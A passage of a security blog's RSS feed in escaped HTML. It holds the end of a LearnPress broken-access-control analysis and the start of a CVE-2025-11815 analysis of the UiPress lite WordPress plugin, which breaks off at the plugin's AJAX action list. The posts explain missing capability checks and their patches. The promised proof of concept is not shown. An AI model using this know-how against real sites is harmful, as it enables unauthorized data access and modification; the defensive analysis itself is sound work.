class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;render_courses&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability stems from a REST API endpoint &lt;strong&gt;without access control&lt;/strong&gt;, allowing unauthenticated attackers to execute internal admin-only callbacks. Using valid IDs, attackers can extract &lt;strong&gt;curriculum&lt;/strong&gt;, &lt;strong&gt;quizzes&lt;/strong&gt;, &lt;strong&gt;answers&lt;/strong&gt;, and other &lt;strong&gt;sensitive course content&lt;/strong&gt;. The 4.3.0 patch resolves this by adding &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; verification to prevent unauthorized access.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;permission_callback = __return_true&lt;/strong&gt; is the root cause of the Broken Access Control issue.&lt;/li&gt;&#xA;&lt;li&gt;Allowing execution of internal callbacks without permissions leads directly to &lt;strong&gt;sensitive data leaks&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;LearnPress admin templates were unintentionally exposed through a public REST API.&lt;/li&gt;&#xA;&lt;li&gt;The effective fix is adding &lt;strong&gt;wp_verify_nonce&lt;/strong&gt; and enforcing capability restrictions.&lt;/li&gt;&#xA;&lt;li&gt;WordPress REST APIs must always implement &lt;strong&gt;capability checks&lt;/strong&gt; when handling sensitive operations.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-plugin-4-2-9-4-missing-authorization-to-unauthenticated-arbitrary-callback-execution-to-information-exposure-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11815 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-10-cve-2025-11815/</link>
      <pubDate>Wed, 10 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-10-cve-2025-11815/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;UiPress lite&lt;/strong&gt; | the &lt;strong&gt;plugin&lt;/strong&gt; that creates &lt;strong&gt;custom dashboards&lt;/strong&gt;, &lt;strong&gt;admin themes&lt;/strong&gt;, and &lt;strong&gt;pages&lt;/strong&gt; for &lt;strong&gt;WordPress&lt;/strong&gt; is easily &lt;strong&gt;exploitable&lt;/strong&gt;, leading to &lt;strong&gt;unauthorized data modification&lt;/strong&gt; due to the lack of &lt;strong&gt;capability checks&lt;/strong&gt; in the &lt;strong&gt;uip_save_site_option()&lt;/strong&gt; function in all versions up to and including &lt;strong&gt;3.5.08&lt;/strong&gt;. This allows an &lt;strong&gt;authenticated attacker&lt;/strong&gt; with &lt;strong&gt;Subscriber-level&lt;/strong&gt; privileges or higher to arbitrarily modify &lt;strong&gt;plugin settings&lt;/strong&gt;. Other &lt;strong&gt;AJAX actions&lt;/strong&gt; are also affected.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11815&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11815&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.08&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.09&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/uipress-lite/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UiPress lite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.08&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.09&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a long list of AJAX actions:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;load_ajax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$function_names&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_users_and_roles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_post_types&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_recent_posts&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_posts_for_table&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_post_table_columns&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_delete_post&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_user_preference&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_user_preference&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_search_content&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_process_form_input&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_send_form_email&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_form_as_option&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_form_as_user_option&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_pre_populate_form_data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_create_frame_switch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_get_sync_options&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_refresh_sync_key&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_sync_options&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_start_site_sync&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_check_for_template_updates&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_process_block_query&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_save_site_option&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_send_message_to_gpt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_global_export&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_global_import&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_push_new_custom_menu_items&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip_remove_custom_menu_items&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$function_names&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;wp_ajax_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 